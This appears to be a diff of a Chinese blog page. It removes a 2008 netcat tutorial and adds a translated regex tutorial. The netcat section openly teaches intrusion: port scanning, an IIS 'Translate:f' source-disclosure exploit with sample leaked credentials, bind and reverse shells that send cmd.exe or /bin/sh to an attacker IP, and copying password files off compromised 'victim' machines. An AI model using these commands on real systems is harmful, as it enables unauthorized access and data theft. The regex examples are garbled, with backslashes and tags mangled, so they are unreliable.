@@ -261,166 +261,6 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/24/netcat-e6-95-99-e7-a8-8b/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="九王爷">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="九王爷">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2008/03/24/netcat-e6-95-99-e7-a8-8b/" itemprop="url">
-                  netcat教程
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-24T13:00:00+08:00">
-                2008-03-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Other/" itemprop="url" rel="index">
-                    <span itemprop="name">Other</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>netcat教程</p>
-<hr>
-<p>在网络工具中有“瑞士军刀”美誉的NetCat， 在我们用了N年了至今仍是爱不释手。因为它短小精悍（这个用在它身上很适合，现在有人已经将其修改成大约10K左右，而且功能不减少）。现在就我的一些使用心得和一些帮助文档中，做一些介绍与大家共勉。<br>1、 了解NC的用法<br>命令：nc –h<br>技巧：win98用户可以在autoexec.bat加入path=nc的路径，win2000用户在环境变量中加入path中，linux含有这个命令（redhat）<br>1、基本使用<br>想要连接到某处: nc [-options] hostname port[s] [ports] …<br>绑定端口等待连接: nc -l -p port [-options] [hostname] [port]<br>参数:<br>-e prog 程序重定向，一旦连接，就执行 [危险!!]<br>-g gateway source-routing hop point[s], up to 8<br>-G num source-routing pointer: 4, 8, 12, …<br>-h 帮助信息<br>-i secs 延时的间隔<br>-l 监听模式，用于入站连接<br>-n 指定数字的IP地址，不能用hostname<br>-o file 记录16进制的传输<br>-p port 本地端口号<br>-r 任意指定本地及远程端口<br>-s addr 本地源地址<br>-u UDP模式<br>-v 详细输出——用两个-v可得到更详细的内容<br>-w secs timeout的时间<br>-z 将输入输出关掉——用于扫描时<br>其中端口号可以指定一个或者用lo-hi式的指定范围。<br>例如：扫描端口<br>tcp扫描<br>C:nc&gt;nc -v -z -w2 192.168.0.80 1-140<br>net [192.168.0.80] 140 (?)<br>net [192.168.0.80] 139 (netbios-ssn) open<br>net [192.168.0.80] 138 (?)<br>net [192.168.0.80] 137 (netbios-ns)<br>net [192.168.0.80] 136 (?)<br>net [192.168.0.80] 135 (epmap) open<br>net [192.168.0.80] 81 (?) open<br>net [192.168.0.80] 80 (http) open<br>net [192.168.0.80] 79 (finger)<br>net [192.168.0.80] 25 (smtp) open<br>net [192.168.0.80] 24 (?)<br>net [192.168.0.80] 23 (telnet)<br>net [192.168.0.80] 21 (ftp)<br>udp扫描<br>C:nc&gt;nc -u -v -z -w2 192.168.0.80 1-140<br>net [192.168.0.80] 140 (?) open<br>net [192.168.0.80] 139 (?) open<br>net [192.168.0.80] 138 (netbios-dgm) open<br>net [192.168.0.80] 137 (netbios-ns) open<br>net [192.168.0.80] 54 (?) open<br>net [192.168.0.80] 53 (domain) open<br>net [192.168.0.80] 38 (?) open<br>net [192.168.0.80] 37 (time) open<br>net [192.168.0.80] 7 (echo) open<br>二、高级应用<br>1．Window用法：<br>（1）IE的MIME欺骗<br>www.try2hack..nl(是一个让初学黑客技术的人去做实验的站点)<br>打开这个页面，有<a href="http://www.try2hack.nl/cgi-bin/level7.pl页面（这个网站提供了黑客的8关，过了这8关证明你开始入门了），这个页面告诉我们的浏览器不是" target="_blank" rel="external">http://www.try2hack.nl/cgi-bin/level7.pl页面（这个网站提供了黑客的8关，过了这8关证明你开始入门了），这个页面告诉我们的浏览器不是</a> IE6.72,我们的操作系统不是LIUNX,我们不是从www.microsoft.com/ms.htm重定向链接过去的，有病阿（这是一个题目呀，要慢慢研究），linux有IE6.72? 微软会在它的页面上放<a href="http://www.try2hack.nl/cgi-bin/level7.pl的链接？看看页面的源代码，level7.pl" target="_blank" rel="external">http://www.try2hack.nl/cgi-bin/level7.pl的链接？看看页面的源代码，level7.pl</a> 是在服务器端执行的perl脚本，根本无法看到，还是研究一下IE5和它通信时都告诉了它什么，抓包，我们会发现，我们的IE5告诉对方：我是MSIE 5.0; Windows NT 5.0; .NET CLR 1.0.3705。。。。哈哈，level7.pl这个cgi应该是根据这些信息知道我们不是它要求的客户，嘿嘿，需要欺骗对方才行，用军刀来可以实现，如下做就可以哄对方了：<br>nc www.try2hack.nl 80 [enter]<br>GET /cgi-bin/level7.pl HTTP/1.1 [enter]<br>Accept: image/gif, image/x-xbitmap, application/msword, <em>/</em> [enter]<br>Referer<a href="http://www.microsoft.com/ms.htm" target="_blank" rel="external">http://www.microsoft.com/ms.htm</a> [enter]<br>Accept-Language: zh-cn [enter]<br>Accept-Encoding: gzip, deflate [enter]<br>User-Agent: Mozilla/4.0 (compatible; MSIE 6.72; Linux 8.8.8 i986) [enter]<br>Host: www.try2hack.nl [enter]<br>Connection:<br>Keep-Alive [enter]<br>注意，如果出现HTTP 400时，说明你输入格式有问题，出现httpd 200回应时，就给出结果了：<br>哈哈！赶快去实现一下（实践是成功之母）<br>（2）IIS 5 “Translate:f” 显示代码脆弱点<br>Translate: f脆弱点的机制：发送一个畸形的HTTP GET 请求给服务器方一个可执行脚本或相关文件类型（例如.ASP或者global.asa）。这些文件是用于服务器上运行的，绝不会到客户机上去，而这个请求就会导致IIS将这种文件的内容发送到远端的客户机上，而不是在服务器上运行。这种畸形的HTTP GET请求的关键特性是该请求的末尾有一个特定的头信息Translate:f，并有一个反斜杠””附于URL之后。下面就有这样的一个例子（[CRLF]代表回车字符）<br>注意 GET global.asa 后的反斜杠以及Translate:f头信息。<br>GET /global.asa HTTP/1.0<br>Host:192.168.0.1<br>User-Agent:SensePostData<br>Content-Type:application/x-www-form-urlencoded<br>Translate:f<br>[CRLF]<br>[CRLF]<br>将以上内容保存在一个文本文件中（例如example.txt）<br>然后向一个有这个漏洞的服务器发送<br>c:&gt;type example.txt | nc –nvv 192.168.0.80 80<br>(UNKNOWN) [192.168.0.80] 80 (?) open<br>HTTP/1.1 200 OK<br>Server: Microsoft-IIS/5.0<br>Date: Tue, 03 Dec 2002 08:50:46 GMT<br>Content-Type: application/octet-stream<br>Content-Length: 2790<br>ETag: “0448299fcd6df1:bea”<br>Last-Modified: Wed, 13 Nov 2002 18:50:46 GMT<br>Accept-Ranges: bytes<br>Cache-Control: no-cache</p>
-<p>(“ConnectionText”) = “Dsn=ph;UID=myman;Password=mygod)”<br>(“LDAPServer”) = “LADP://ldap.netloafer.com:389”<br>(“LDAPUserID”) = “CN=Admin”<br>(“LDAPPwd”) = “mygod”<br>………</p>
-<p>3.1.端口的刺探：<br>nc -vv ip port<br>RIVER [192.168.0.198] 19190 (?) open //显示是否开放open<br>3.2.扫描器<br>nc -vv -w 5 ip port-port port<br>nc -vv -z ip port-port port<br>这样扫描会留下大量的痕迹，系统管理员会额外小心</p>
-<p>3.3. 后门<br>victim machine: //受害者的机器<br>nc -l -p port -e cmd.exe //win2000<br>nc -l -p port -e /bin/sh //unix,linux<br>attacker machine: //攻击者的机器.<br>nc ip -p port //连接victim_IP,然后得到一个shell。</p>
-<p>3.4.反向连接<br>attacker machine: //一般是sql2.exe,远程溢出,webdavx3.exe攻击.<br>//或者wollf的反向连接.<br>nc -vv -l -p port<br>victim machine:<br>nc -e cmd.exe attacker ip -p port<br>nc -e /bin/sh attacker ip -p port</p>
-<p>或者：<br>attacker machine:<br>nc -vv -l -p port1 /<em>用于输入</em>/<br>nc -vv -l -p prot2 /<em>用于显示</em>/<br>victim machine:<br>nc attacker_ip port1 | cmd.exe | nc attacker_ip port2<br>nc attacker_ip port1 | /bin/sh | nc attacker_ip port2</p>
-<p>139要加参数-s（nc.exe -L -p 139 -d -e cmd.exe -s 对方机器IP）<br>这样就可以保证nc.exe优先于NETBIOS。</p>
-<p>3.5.传送文件：<br>3.5.1 attacker machine &lt;– victim machine //从肉鸡拖密码文件回来.<br>nc -d -l -p port &lt; pathfiledest 　　　 /<em>attacker machine</em>/ 可以shell执行<br>nc -vv attacker_ip port &gt; pathfile.txt /<em>victim machine</em>/ 需要Ctrl+C退出<br>//肉鸡需要gui界面的cmd.exe里面执行(终端登陆,不如安装FTP方便).否则没有办法输入Crl+C.</p>
-<p>3.5.2 attacker machine –&gt; victim machine //上传命令文件到肉鸡<br>nc －vv -l -p port &gt; pathfile.txt　　　　　 /<em>victim machine</em>/ 需要Ctrl+C退出<br>nc -d victim_ip port &lt; pathfiledest 　 /<em>attacker machine</em>/ 可以shell执行<br>//这样比较好.我们登陆终端.入侵其他的肉鸡.可以选择shell模式登陆.</p>
-<p>结论: 可以传输ascii,bin文件.可以传输程序文件.</p>
-<p>问题:连接某个ip后,传送完成后,需要发送Ctrl+C退出nc.exe .<br>或者只有再次连接使用pskill.exe 杀掉进程.但是是否释放传输文件打开的句柄了?</p>
-<p>3.6 端口数据抓包.<br>nc -vv -w 2 -o test.txt www.xfocus.net 80 21-15</p>
-<p>&lt; 00000058 35 30 30 20 53 79 6e 74 61 78 20 65 72 72 6f 72 # 500 Syntax error<br>&lt; 00000068 2c 20 63 6f 6d 6d 61 6e 64 20 22 22 20 75 6e 72 # , command “” unr<br>&lt; 00000078 65 63 6f 67 6e 69 7a 65 64 2e 0d 0a # ecognized…<br>&lt; 00000084 83 00 00 01 8f # …..</p>
-<p>3.7 telnet,自动批处理。 ★★★★★我要重点推荐的东西就是这个.<br>nc victim_ip port &lt; pathfile.cmd 　 /<em>victim machine</em>/ 显示执行过程.<br>nc -vv victim_ip port &lt; pathfile.cmd 　 /<em>victim machine</em>/ 显示执行过程.</p>
-<p>nc -d victim_ip port &lt; pathfile.cmd 安静模式.</p>
-<p><strong><strong><strong>___</strong></strong></strong>file.cmd<strong><strong><strong><strong><strong><em>__</em></strong></strong></strong></strong></strong><br>password<br>cd %windir%<br>echo []=[%windir%]<br>c:<br>cd<br>md test<br>cd /d %windir%system32<br>net stop sksockserver<br>snake.exe -config port 11111<br>net start sksockserver<br>exit<br><strong><strong><strong>___</strong></strong></strong>file.cmd<strong>END<strong><strong><strong><strong>_</strong></strong></strong></strong></strong></p>
-<hr>
-<p>在网络工具中有“瑞士军刀”美誉的NetCat， 在我们用了N年了至今仍是爱不释手。因为它短小精悍（这个用在它身上很适合，现在有人已经将其修改成大约10K左右，而且功能不减少）。现在就我的一些使用心得和一些帮助文档中，做一些介绍与大家共勉。<br>1、 了解NC的用法<br>命令：nc –h<br>技巧：win98用户可以在autoexec.bat加入<br>path=nc的路径，win2000用户在环境变量中加入path中，linux含有这个命令（redhat）<br>1、基本使用<br>想要连接到某处: nc [-options] hostname port[s] [ports] …<br>绑定端口等待连接: nc -l -p port [-options] [hostname] [port]<br>参数:<br>-e prog 程序重定向，一旦连接，就执行 [危险!!]<br>-g gateway source-routing hop point[s], up to 8<br>-G num source-routing pointer: 4, 8, 12, …<br>-h 帮助信息<br>-i secs 延时的间隔<br>-l 监听模式，用于入站连接<br>-n 指定数字的IP地址，不能用hostname<br>-o file 记录16进制的传输<br>-p port 本地端口号<br>-r 任意指定本地及远程端口<br>-s addr 本地源地址<br>-u UDP模式<br>-v 详细输出——用两个-v可得到更详细的内容<br>-w secs timeout的时间<br>-z 将输入输出关掉——用于扫描时<br>其中端口号可以指定一个或者用lo-hi式的指定范围。<br>例如：扫描端口<br>tcp扫描<br>C:nc&gt;nc -v -z -w2 192.168.0.80 1-140<br>net [192.168.0.80] 140 (?)<br>net [192.168.0.80] 139 (netbios-ssn) open<br>net [192.168.0.80] 138 (?)<br>net [192.168.0.80] 137 (netbios-ns)<br>net [192.168.0.80] 136 (?)<br>net [192.168.0.80] 135 (epmap) open<br>net [192.168.0.80] 81 (?) open<br>net [192.168.0.80] 80 (http) open<br>net [192.168.0.80] 79 (finger)<br>net [192.168.0.80] 25 (smtp) open<br>net [192.168.0.80] 24 (?)<br>net [192.168.0.80] 23 (telnet)<br>net [192.168.0.80] 21 (ftp)<br>udp扫描<br>C:nc&gt;nc -u -v -z -w2 192.168.0.80 1-140<br>net [192.168.0.80] 140 (?) open<br>net [192.168.0.80] 139 (?) open<br>net [192.168.0.80] 138 (netbios-dgm) open<br>net [192.168.0.80] 137 (netbios-ns) open<br>net [192.168.0.80] 54 (?) open<br>net [192.168.0.80] 53 (domain) open<br>net [192.168.0.80] 38 (?) open<br>net [192.168.0.80] 37 (time) open<br>net [192.168.0.80] 7 (echo) open<br>二、高级应用<br>1．Window用法：<br>（1）IE的MIME欺骗<br>www.try2hack..nl(是一个让初学黑客技术的人去做实验的站点)<br>打开这个页面，有个<a href="http://www.try2hack.nl/cgi-bin/level7.pl页面（这个网站提供了黑客的8关，过了这8关证明你开始入门了），这个页面告诉我们的浏览器不是" target="_blank" rel="external">http://www.try2hack.nl/cgi-bin/level7.pl页面（这个网站提供了黑客的8关，过了这8关证明你开始入门了），这个页面告诉我们的浏览器不是</a> IE6.72,我们的操作系统不是LIUNX,我们不是从www.microsoft.com/ms.htm重定向链接过去的，有病阿（这是一个题目呀，要慢慢研究），linux有IE6.72? 微软会在它的页面上放上<a href="http://www.try2hack.nl/cgi-bin/level7.pl的链接？看看页面的源代码，" target="_blank" rel="external">http://www.try2hack.nl/cgi-bin/level7.pl的链接？看看页面的源代码，</a> level7.pl是在服务器端执行的perl脚本，根本无法看到，还是研究一下IE5和它通信时都告诉了它什么，抓包，我们会发现，我们的IE5告诉对方： 我是MSIE 5.0; Windows NT 5.0; .NET CLR 1.0.3705。。。。哈哈，level7.pl这个cgi应该是根据这些信息知道我们不是它要求的客户，嘿嘿，需要欺骗对方才行，用军刀来可以实现，如下做就可以哄对方了：<br>nc www.try2hack.nl 80 [enter]<br>GET /cgi-bin/level7.pl HTTP/1.1 [enter]<br>Accept: image/gif, image/x-xbitmap, application/msword, <em>/</em> [enter]<br>Referer:<a href="http://www.microsoft.com/ms.htm" target="_blank" rel="external">http://www.microsoft.com/ms.htm</a> [enter]<br>Accept-Language: zh-cn [enter]<br>Accept-Encoding: gzip, deflate [enter]<br>User-Agent: Mozilla/4.0 (compatible; MSIE 6.72; Linux 8.8.8 i986) [enter]<br>Host: www.try2hack.nl [enter]<br>Connection:<br>Keep-Alive [enter]<br>注意，如果出现HTTP 400时，说明你输入格式有问题，出现httpd 200回应时，就给出结果了：<br>哈哈！赶快去实现一下（实践是成功之母）<br>（2）IIS 5 “Translate:f” 显示代码脆弱点<br>Translate:f 脆弱点的机制：发送一个畸形的HTTP GET 请求给服务器方一个可执行脚本或相关文件类型（例如.ASP或者global.asa）。这些文件是用于服务器上运行的，绝不会到客户机上去，而这个请求就会导致IIS将这种文件的内容发送到远端的客户机上，而不是在服务器上运行。这种畸形的HTTP GET请求的关键特性是该请求的末尾有一个特定的头信息Translate:f，并有一个反斜杠””附于URL之后。下面就有这样的一个例子（[CRLF]代表回车字符）<br>注意 GET global.asa 后的反斜杠以及Translate:f头信息。<br>GET /global.asa HTTP/1.0<br>Host:192.168.0.1<br>User-Agent:SensePostData<br>Content-Type:application/x-www-form-urlencoded<br>Translate:f<br>[CRLF]<br>[CRLF]<br>将以上内容保存在一个文本文件中（例如example.txt）<br>然后向一个有这个漏洞的服务器发送<br>c:&gt;type example.txt | nc –nvv 192.168.0.80 80<br>(UNKNOWN) [192.168.0.80] 80 (?) open<br>HTTP/1.1 200 OK<br>Server: Microsoft-IIS/5.0<br>Date: Tue, 03 Dec 2002 08:50:46 GMT<br>Content-Type: application/octet-stream<br>Content-Length: 2790<br>ETag: “0448299fcd6df1:bea”<br>Last-Modified: Wed, 13 Nov 2002 18:50:46 GMT<br>Accept-Ranges: bytes<br>Cache-Control: no-cache</p>
-<p>(“ConnectionText”) = “Dsn=ph;UID=myman;Password=mygod)”<br>(“LDAPServer”) = “LADP://ldap.netloafer.com:389”<br>(“LDAPUserID”) = “CN=Admin”<br>(“LDAPPwd”) = “mygod”</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/24/vim-e4-b8-8b-e6-b7-bb-e5-8a-a0-e8-a1-8c-e5-8f-b7-e7-9a-84-e7-a7-8d-e7-a7-8d-e6-96-b9-e6-b3-95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1056,6 +896,249 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/23/e6-b7-b1-e5-85-a5-e6-b5-85-e5-87-ba-e4-b9-8b-e6-ad-a3-e5-88-99-e8-a1-a8-e8-be-be-e5-bc-8f-ef-bc-88-e4-ba-8c-ef-bc-89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="九王爷">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="九王爷">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2008/03/23/e6-b7-b1-e5-85-a5-e6-b5-85-e5-87-ba-e4-b9-8b-e6-ad-a3-e5-88-99-e8-a1-a8-e8-be-be-e5-bc-8f-ef-bc-88-e4-ba-8c-ef-bc-89/" itemprop="url">
+                  深入浅出之正则表达式（二）
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-23T22:52:56+08:00">
+                2008-03-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Other/" itemprop="url" rel="index">
+                    <span itemprop="name">Other</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>`前言：<br>       本文是前一片文章《深入浅出之正则表达式（一）》的续篇，在本文中讲述了正则表达式中的组与向后引用，先前向后查看，条件测试，单词边界，选择符等表达式及例子，并分析了正则引擎在执行匹配时的内部机理。<br>       本文是Jan Goyvaerts为RegexBuddy写的教程的译文，版权归原作者所有，欢迎转载。但是为了尊重原作者和译者的劳动，请注明出处！谢谢！</p>
+<p>9.      单词边界</p>
+<p>元字符&lt;**&gt;也是一种对位置进行匹配的“锚”。这种匹配是0长度匹配。</p>
+<p>有4种位置被认为是“单词边界”：</p>
+<p>1)        在字符串的第一个字符前的位置(如果字符串的第一个字符是一个“单词字符”)</p>
+<p>2)        在字符串的最后一个字符后的位置(如果字符串的最后一个字符是一个“单词字符”)</p>
+<p>3)        在一个“单词字符”和“非单词字符”之间，其中“非单词字符”紧跟在“单词字符”之后</p>
+<p>4)        在一个“非单词字符”和“单词字符”之间，其中“单词字符”紧跟在“非单词字符”后面</p>
+<p> “单词字符”是可以用“w”匹配的字符，“非单词字符”是可以用“W”匹配的字符。在大多数的正则表达式实现中，“单词字符”通常包括&lt;&lt;[a-zA-Z0-9_]&gt;&gt;。</p>
+<p>例如：&lt;<b4b>&gt;能够匹配单个的4而不是一个更大数的一部分。这个正则表达式不会匹配“44”中的4。</b4b></p>
+<p>换种说法，几乎可以说&lt;<b>&gt;匹配一个“字母数字序列”的开始和结束的位置。</b></p>
+<p>“单词边界”的取反集为&lt;<b>&gt;，他要匹配的位置是两个“单词字符”之间或者两个“非单词字符”之间的位置。</b></p>
+<p>·        深入正则表达式引擎内部</p>
+<p>让我们看看把正则表达式&lt;<bisb>&gt;应用到字符串“This island is beautiful”。引擎先处理符号&lt;<b>&gt;。因为b是0长度 ，所以第一个字符T前面的位置会被考察。因为T是一个“单词字符”，而它前面的字符是一个空字符(void)，所以b匹配了单词边界。接着<_>和第一个字符“T”匹配失败。匹配过程继续进行，直到第五个空格符，和第四个字符“s”之间又匹配了&lt;<b>&gt;。然而空格符和&lt;<i>&gt;不匹配。继续向后，到了第六个字符“i”，和第五个空格字符之间匹配了&lt;<b>&gt;，然后&lt;<is>&gt;和第六、第七个字符都匹配了。然而第八个字符和第二个“单词边界”不匹配，所以匹配又失败了。到了第13个字符i，因为和前面一个空格符形成“单词边界”，同时&lt;<is>&gt;和“is”匹配。引擎接着尝试匹配第二个&lt;<b>&gt;。因为第15个空格符和“s”形成单词边界，所以匹配成功。引擎“急着”返回成功匹配的结果。</b></is></is></b></i></b></_></b></bisb></p>
+<p>10.  选择符</p>
+<p>正则表达式中“|”表示选择。你可以用选择符匹配多个可能的正则表达式中的一个。</p>
+<p>如果你想搜索文字“cat”或“dog”，你可以用&lt;<cat|dog>&gt;。如果你想有更多的选择，你只要扩展列表&lt;<cat|dog|mouse|fish>&gt;。</cat|dog|mouse|fish></cat|dog></p>
+<p>选择符在正则表达式中具有最低的优先级，也就是说，它告诉引擎要么匹配选择符左边的所有表达式，要么匹配右边的所有表达式。你也可以用圆括号来限制选择符的作用范围。如&lt;<b(cat|dog)b>&gt;，这样告诉正则引擎把(cat|dog)当成一个正则表达式单位来处理。</b(cat|dog)b></p>
+<p>·        注意正则引擎的“急于表功”性</p>
+<p>正则引擎是急切的，当它找到一个有效的匹配时，它会停止搜索。因此在一定条件下，选择符两边的表达式的顺序对结果会有影响。假设你想用正则表达式搜索一个编程语言的函数列表：Get，GetValue，Set或SetValue。一个明显的解决方案是&lt;<get|getvalue|set|setvalue>&gt;。让我们看看当搜索SetValue时的结果。</get|getvalue|set|setvalue></p>
+<p>因为&lt;<get>&gt;和&lt;<getvalue>&gt;都失败了，而&lt;<set>&gt;匹配成功。因为正则导向的引擎都是“急切”的，所以它会返回第一个成功的匹配，就是“Set”，而不去继续搜索是否有其他更好的匹配。</set></getvalue></get></p>
+<p>和我们期望的相反，正则表达式并没有匹配整个字符串。有几种可能的解决办法。一是考虑到正则引擎的“急切”性，改变选项的顺序，例如我们使用&lt;<getvalue|get|setvalue|set>&gt;，这样我们就可以优先搜索最长的匹配。我们也可以把四个选项结合起来成两个选项：&lt;<get(value)?|set(value)?>&gt;。因为问号重复符是贪婪的，所以SetValue总会在Set之前被匹配。</get(value)?|set(value)?></getvalue|get|setvalue|set></p>
+<p>一个更好的方案是使用单词边界：&lt;<b(get|getvalue|set|setvalue)b>&gt;或&lt;<b(get(value)?|set(value)?b>&gt;。更进一步，既然所有的选择都有相同的结尾，我们可以把正则表达式优化为&lt;<b(get|set)(value)?b>&gt;。</b(get|set)(value)?b></b(get(value)?|set(value)?b></b(get|getvalue|set|setvalue)b></p>
+<p>11.  组与向后引用</p>
+<p>把正则表达式的一部分放在圆括号内，你可以将它们形成组。然后你可以对整个组使用一些正则操作，例如重复操作符。</p>
+<p>要注意的是，只有圆括号“()”才能用于形成组。“[]”用于定义字符集。“{}”用于定义重复操作。</p>
+<p>当用“()”定义了一个正则表达式组后，正则引擎则会把被匹配的组按照顺序编号，存入缓存。当对被匹配的组进行向后引用的时候，可以用“数字”的方式进行引用。&lt;<1>&gt;引用第一个匹配的后向引用组，&lt;<2>&gt;引用第二个组，以此类推，&lt;<n>&gt;引用第n个组。而&lt;&lt; &gt;&gt;则引用整个被匹配的正则表达式本身。我们看一个例子。</n></2></1></p>
+<p>假设你想匹配一个HTML标签的开始标签和结束标签，以及标签中间的文本。比如<b>This is a test<strong>，我们要匹配</strong>和<em>*以及中间的文字。我们可以用如下正则表达式：“&lt;([A-Z][A-Z0-9]</em>)[^&gt;]<em>&gt;.</em>?”</b></p>
+<p>首先，“&lt;”将会匹配“<strong>”的第一个字符“&lt;”。然后[A-Z]匹配B，[A-Z0-9]<em>将会匹配0到多次字母数字，后面紧接着0到多个非“&gt;”的字符。最后正则表达式的“&gt;”将会匹配“<b>”的“&gt;”。接下来正则引擎将对结束标签之前的字符进行惰性匹配，直到遇到一个“&lt;/”符号。然后正则表达式中的“1”表示对前面匹配的组“([A-Z][A-Z0-9]</b></em>)”进行引用，在本例中，被引用的是标签名“B”。所以需要被匹配的结尾标签为“</strong>”</p>
+<p>你可以对相同的后向引用组进行多次引用，&lt;&lt;([a-c])x1x1&gt;&gt;将匹配“axaxa”、“bxbxb”以及“cxcxc”。如果用数字形式引用的组没有有效的匹配，则引用到的内容简单的为空。</p>
+<p>一个后向引用不能用于它自身。&lt;&lt;([abc]1)&gt;&gt;是错误的。因此你不能将&lt;&lt; &gt;&gt;用于一个正则表达式匹配本身，它只能用于替换操作中。</p>
+<p>后向引用不能用于字符集内部。&lt;&lt;(a)[1b]&gt;&gt;中的&lt;<1>&gt;并不表示后向引用。在字符集内部，&lt;<1>&gt;可以被解释为八进制形式的转码。</1></1></p>
+<p>向后引用会降低引擎的速度，因为它需要存储匹配的组。如果你不需要向后引用，你可以告诉引擎对某个组不存储。例如：&lt;<get(?:value)>&gt;。其中“(”后面紧跟的“?:”会告诉引擎对于组(Value)，不存储匹配的值以供后向引用。</get(?:value)></p>
+<p>·        重复操作与后向引用</p>
+<p>当对组使用重复操作符时，缓存里后向引用内容会被不断刷新，只保留最后匹配的内容。例如：&lt;&lt;([abc]+)=1&gt;&gt;将匹配“cab=cab”，但是&lt;&lt;([abc])+=1&gt;&gt;却不会。因为([abc])第一次匹配“c”时，“1”代表“c”；然后([abc])会继续匹配“a”和“b”。最后“1”代表“b”，所以它会匹配“cab=b”。</p>
+<p>应用：检查重复单词–当编辑文字时，很容易就会输入重复单词，例如“the the”。使用&lt;<b(w+)s+1b>&gt;可以检测到这些重复单词。要删除第二个单词，只要简单的利用替换功能替换掉“1”就可以了。</b(w+)s+1b></p>
+<p>·        组的命名和引用</p>
+<p>在PHP，Python中，可以用&lt;&lt;(?P<name>group)&gt;&gt;来对组进行命名。在本例中，词法?P<name>就是对组(group)进行了命名。其中name是你对组的起的名字。你可以用(?P=name)进行引用。</name></name></p>
+<p>.NET的命名组</p>
+<p>.NET framework也支持命名组。不幸的是，微软的程序员们决定发明他们自己的语法，而不是沿用Perl、Python的规则。目前为止，还没有任何其他的正则表达式实现支持微软发明的语法。</p>
+<p>下面是.NET中的例子：</p>
+<p>(?<first>group)(?’second’group)</first></p>
+<p>正如你所看到的，.NET提供两种词法来创建命名组：一是用尖括号“&lt;&gt;”，或者用单引号“’’”。尖括号在字符串中使用更方便，单引号在ASP代码中更有用，因为ASP代码中“&lt;&gt;”被用作HTML标签。</p>
+<p>要引用一个命名组，使用k<name>或k’name’.</name></p>
+<p>当进行搜索替换时，你可以用“${name}”来引用一个命名组。</p>
+<p>12.  正则表达式的匹配模式</p>
+<p>本教程所讨论的正则表达式引擎都支持三种匹配模式：</p>
+<p><_>使正则表达式对大小写不敏感，</_></p>
+<p>&lt;&gt;开启“单行模式”，即点号“.”匹配新行符</p>
+<p>&lt;&gt;开启“多行模式”，即“^”和“$”匹配新行符的前面和后面的位置。</p>
+<p>·        在正则表达式内部打开或关闭模式</p>
+<p>如果你在正则表达式内部插入修饰符(?ism)，则该修饰符只对其右边的正则表达式起作用。(?-i)是关闭大小写不敏感。你可以很快的进行测试。&lt;&lt;(?i)te(?-i)st&gt;&gt;应该匹配TEst，但是不能匹配teST或TEST.</p>
+<p>13.  原子组与防止回溯</p>
+<p>在一些特殊情况下，因为回溯会使得引擎的效率极其低下。</p>
+<p>让我们看一个例子：要匹配这样的字串，字串中的每个字段间用逗号做分隔符，第12个字段由P开头。</p>
